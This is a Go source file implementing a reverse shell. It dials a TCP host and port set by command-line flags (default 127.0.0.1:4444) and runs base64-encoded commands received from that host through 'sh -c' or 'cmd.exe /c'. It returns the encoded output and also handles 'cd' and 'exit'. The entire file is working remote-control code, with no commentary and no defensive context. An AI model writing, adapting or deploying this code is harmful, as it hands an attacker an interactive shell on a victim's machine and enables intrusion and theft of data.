package main

import (
        "bufio"
        "encoding/base64"
        "flag"
        "fmt"
        "net"
        "os"
        "os/exec"
        "runtime"
        "strings"
)

const os_version string = runtime.GOOS

func main() {
        host := flag.String("host", "127.0.0.1", "Host to connect to")
        port := flag.String("port", "4444", "Port to connect to")
        flag.Parse()
        server := *host + ":" + *port
        addr, err := net.ResolveTCPAddr("tcp", server)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        conn, err := net.DialTCP("tcp", nil, addr)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        for {
                func(c net.Conn) {
                        message, err := bufio.NewReader(c).ReadString('\n')
                        if err != nil {
                                fmt.Println("Error: ", err)
                        }
                        dec_mess, _ := base64.StdEncoding.DecodeString(message)
                        //results := exec_cmd(message)
                        results := exec_cmd(string(dec_mess))
                        enc_mess := encode(string(results))
                        c.Write([]byte(enc_mess + "\n"))
                }(conn)
        }
}

func exec_cmd(cmd string) []byte {
        parts := strings.Fields(cmd)
        head := parts[0]
        parts = parts[1:len(parts)]
        switch head {
        case "exit":
                os.Exit(0)
        case "cd":
                os.Chdir(parts[0])
                return []byte("dir chaged")
        default:
                //out, err := exec.Command(head, parts...).Output()
                if os_version != "windows" {
                        out, err := exec.Command("sh", "-c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                } else {
                        out, err := exec.Command("cmd.exe", "/c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                }

        }
        return nil
}

func encode(str string) string {
        return base64.StdEncoding.EncodeToString([]byte(str))
}
